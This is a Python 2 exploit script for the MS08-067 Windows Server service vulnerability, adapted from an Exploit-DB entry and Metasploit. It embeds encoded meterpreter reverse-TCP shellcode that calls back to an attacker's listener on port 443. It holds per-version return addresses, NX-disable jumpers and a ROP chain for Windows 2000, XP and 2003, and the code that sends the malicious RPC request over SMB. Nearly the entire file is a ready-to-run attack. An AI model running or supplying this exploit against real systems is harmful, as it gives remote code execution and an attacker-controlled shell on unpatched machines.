import struct
import time
import sys


from threading import Thread    #Thread is imported incase you would like to modify


try:

    from impacket import smb

    from impacket import uuid

    from impacket import dcerpc

    from impacket.dcerpc.v5 import transport


except ImportError, _:

    print 'Install the following library to make this script work'

    print 'Impacket : http://oss.coresecurity.com/projects/impacket.html'

    print 'PyCrypto : http://www.amk.ca/python/code/crypto.html'

    sys.exit(1)


print '#######################################################################'

print '#   MS08-067 Exploit'

print '#   This is a modified verion of Debasis Mohanty\'s code (https://www.exploit-db.com/exploits/7132/).'

print '#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi'

print '#######################################################################\n'


#Reverse TCP shellcode from metasploit; port 443 IP 192.168.40.103; badchars \x00\x0a\x0d\x5c\x5f\x2f\x2e\x40;
#Make sure there are enough nops at the begining for the decoder to work. Payload size: 380 bytes (nopsleps are not included)
#EXITFUNC=thread Important!
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.77 LPORT=443  EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python
buf =  b""
buf += b"\x31\xc9\x83\xe9\xa5\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += b"\x76\x0e\x43\xc0\x87\xf1\x83\xee\xfc\xe2\xf4\xbf\x28"
buf += b"\x05\xf1\x43\xc0\xe7\x78\xa6\xf1\x47\x95\xc8\x90\xb7"
buf += b"\x7a\x11\xcc\x0c\xa3\x57\x4b\xf5\xd9\x4c\x77\xcd\xd7"
buf += b"\x72\x3f\x2b\xcd\x22\xbc\x85\xdd\x63\x01\x48\xfc\x42"
buf += b"\x07\x65\x03\x11\x97\x0c\xa3\x53\x4b\xcd\xcd\xc8\x8c"
buf += b"\x96\x89\xa0\x88\x86\x20\x12\x4b\xde\xd1\x42\x13\x0c"
buf += b"\xb8\x5b\x23\xbd\xb8\xc8\xf4\x0c\xf0\x95\xf1\x78\x5d"
buf += b"\x82\x0f\x8a\xf0\x84\xf8\x67\x84\xb5\xc3\xfa\x09\x78"
buf += b"\xbd\xa3\x84\xa7\x98\x0c\xa9\x67\xc1\x54\x97\xc8\xcc"
buf += b"\xcc\x7a\x1b\xdc\x86\x22\xc8\xc4\x0c\xf0\x93\x49\xc3"
buf += b"\xd5\x67\x9b\xdc\x90\x1a\x9a\xd6\x0e\xa3\x9f\xd8\xab"
buf += b"\xc8\xd2\x6c\x7c\x1e\xa8\xb4\xc3\x43\xc0\xef\x86\x30"
buf += b"\xf2\xd8\xa5\x2b\x8c\xf0\xd7\x44\x49\x6f\x0e\x93\x78"
buf += b"\x17\xf0\x43\xc0\xae\x35\x17\x90\xef\xd8\xc3\xab\x87"
buf += b"\x0e\x96\xaa\x8d\x99\x49\xcb\x87\x83\x2b\xc2\x87\xf0"
buf += b"\xf8\x49\x61\xa1\x13\x90\xd7\xb1\x13\x80\xd7\x99\xa9"
buf += b"\xcf\x58\x11\xbc\x15\x10\x9b\x53\x96\xd0\x99\xda\x65"
buf += b"\xf3\x90\xbc\x15\x02\x31\x37\xca\x78\xbf\x4b\xb5\x6b"
buf += b"\x19\x24\xc0\x87\xf1\x29\xc0\xed\xf5\x15\x97\xef\xf3"
buf += b"\x9a\x08\xd8\x0e\x96\x43\x7f\xf1\x3d\xf6\x0c\xc7\x29"
buf += b"\x80\xef\xf1\x53\xc0\x87\xa7\x29\xc0\xef\xa9\xe7\x93"
buf += b"\x62\x0e\x96\x53\xd4\x9b\x43\x96\xd4\xa6\x2b\xc2\x5e"
buf += b"\x39\x1c\x3f\x52\x72\xbb\xc0\xfa\xd9\x1b\xa8\x87\xb1"
buf += b"\x43\xc0\xed\xf1\x13\xa8\x8c\xde\x4c\xf0\x78\x24\x14"
buf += b"\xa8\xf2\x9f\x0e\xa1\x78\x24\x1d\x9e\x78\xfd\x67\xcf"
buf += b"\x02\x81\xbc\x3f\x78\x18\xd8\x3f\x78\x0e\x42\x03\xae"
buf += b"\x37\x36\x01\x44\x4a\xa3\xdd\xad\xfb\x2b\x66\x12\x4c"
buf += b"\xde\x3f\x52\xcd\x45\xbc\x8d\x71\xb8\x20\xf2\xf4\xf8"
buf += b"\x87\x94\x83\x2c\xaa\x87\xa2\xbc\x15\x87\xf1"

nonxjmper = "\x08\x04\x02\x00%s"+"A"*4+"%s"+"A"*42+"\x90"*8+"\xeb\x62"+"A"*10
disableNXjumper = "\x08\x04\x02\x00%s%s%s"+"A"*28+"%s"+"\xeb\x02"+"\x90"*2+"\xeb\x62"
ropjumper = "\x00\x08\x01\x00"+"%s"+"\x10\x01\x04\x01";
module_base = 0x6f880000
def generate_rop(rvas):
	gadget1="\x90\x5a\x59\xc3"
	gadget2 = ["\x90\x89\xc7\x83", "\xc7\x0c\x6a\x7f", "\x59\xf2\xa5\x90"]	
	gadget3="\xcc\x90\xeb\x5a"	
	ret=struct.pack('<L', 0x00018000)
	ret+=struct.pack('<L', rvas['call_HeapCreate']+module_base)
	ret+=struct.pack('<L', 0x01040110)
	ret+=struct.pack('<L', 0x01010101)
	ret+=struct.pack('<L', 0x01010101)
	ret+=struct.pack('<L', rvas['add eax, ebp / mov ecx, 0x59ffffa8 / ret']+module_base)
	ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)
	ret+=gadget1
	ret+=struct.pack('<L', rvas['mov [eax], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['jmp eax']+module_base)
	ret+=gadget2[0]
	ret+=gadget2[1]
	ret+=struct.pack('<L', rvas['mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)
	ret+=gadget2[2]
	ret+=struct.pack('<L', rvas['mov [eax+0x10], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['add eax, 8 / ret']+module_base)
	ret+=struct.pack('<L', rvas['jmp eax']+module_base)
	ret+=gadget3	
	return ret
class SRVSVC_Exploit(Thread):

    def __init__(self, target, os, port=445):

        super(SRVSVC_Exploit, self).__init__()

        self.__port   = port

        self.target   = target
	self.os	      = os


    def __DCEPacket(self):
	if (self.os=='1'):
		print 'Windows XP SP0/SP1 Universal\n'
		ret = "\x61\x13\x00\x01"
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='2'):
		print 'Windows 2000 Universal\n'
		ret = "\xb0\x1c\x1f\x00"
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='3'):
		print 'Windows 2003 SP0 Universal\n'
		ret = "\x9e\x12\x00\x01"  #0x01 00 12 9e
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='4'):
		print 'Windows 2003 SP1 English\n'
		ret_dec = "\x8c\x56\x90\x7c"  #0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
		ret_pop = "\xf4\x7c\xa2\x7c"  #0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
		jmp_esp = "\xd3\xfe\x86\x7c" #0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
		disable_nx = "\x13\xe4\x83\x7c" #0x 7c 83 e4 13 NX disable @NTDLL.DLL
		jumper = disableNXjumper % (ret_dec*6, ret_pop, disable_nx, jmp_esp*2)
	elif (self.os=='5'):
		print 'Windows XP SP3 French (NX)\n'
		ret = "\x07\xf8\x5b\x59"  #0x59 5b f8 07 
		disable_nx = "\xc2\x17\x5c\x59" #0x59 5c 17 c2 
		jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
	elif (self.os=='6'):
		print 'Windows XP SP3 English (NX)\n'
		ret = "\x07\xf8\x88\x6f"  #0x6f 88 f8 07 
		disable_nx = "\xc2\x17\x89\x6f" #0x6f 89 17 c2 
		jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
	elif (self.os=='7'):
		print 'Windows XP SP3 English (AlwaysOn NX)\n'
		rvasets = {'call_HeapCreate': 0x21286,'add eax, ebp / mov ecx, 0x59ffffa8 / ret' : 0x2e796,'pop ecx / ret':0x2e796 + 6,'mov [eax], ecx / ret':0xd296,'jmp eax':0x19c6f,'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret':0x10a56,'mov [eax+0x10], ecx / ret':0x10a56 + 6,'add eax, 8 / ret':0x29c64}
		jumper = generate_rop(rvasets)+"AB"  #the nonxjmper also work in this case.
	else:
		print 'Not supported OS version\n'
		sys.exit(-1)
	print '[-]Initiating connection'

        self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % self.target)

        self.__trans.connect()

        print '[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target

        self.__dce = self.__trans.DCERPC_class(self.__trans)

        self.__dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))




        path ="\x5c\x00"+"ABCDEFGHIJ"*10 + buf +"\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00" + "\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00"  + jumper + "\x00" * 2

        server="\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
        prefix="\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"

        self.__stub=server+"\x36\x01\x00\x00\x00\x00\x00\x00\x36\x01\x00\x00" + path +"\xE8\x03\x00\x00"+prefix+"\x01\x10\x00\x00\x00\x00\x00\x00"

        return



    def run(self):

        self.__DCEPacket()

        self.__dce.call(0x1f, self.__stub) 
        time.sleep(5)
        print 'Exploit finish\n'



if __name__ == '__main__':

       try:

           target = sys.argv[1]
	   os = sys.argv[2]

       except IndexError:

				print '\nUsage: %s <target ip>\n' % sys.argv[0]

				print 'Example: MS08_067.py 192.168.1.1 1 for Windows XP SP0/SP1 Universal\n'
				print 'Example: MS08_067.py 192.168.1.1 2 for Windows 2000 Universal\n'

				sys.exit(-1)



current = SRVSVC_Exploit(target, os)

current.start()
